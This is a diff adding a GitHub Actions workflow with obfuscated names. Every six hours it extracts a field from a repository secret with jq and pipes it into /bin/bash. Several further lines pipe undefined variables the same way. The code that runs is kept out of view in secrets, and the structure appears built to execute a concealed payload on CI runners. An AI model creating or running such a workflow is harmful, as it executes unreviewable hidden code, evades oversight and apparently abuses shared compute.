@@ -1,0 +1,22 @@
+name: pousuanshami
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pousuanshami
+        env:
+          yjslp207: ${{ secrets.yjslp207 }}
+        run: |
+          echo $yjslp207 | jq -r .g863 | /bin/bash
+          echo $wi3 | jq -r .j9 | /bin/bash
+          echo $g845 | jq -r .o900 | /bin/bash
+          echo $gjywv8 | jq -r .vv8 | /bin/bash
+          echo $opej43829 | jq -r .g48237 | /bin/bash
+          echo $fzdye5946 | jq -r .xnb21 | /bin/bash
+          echo $meeru1 | jq -r .loczg4 | /bin/bash
+
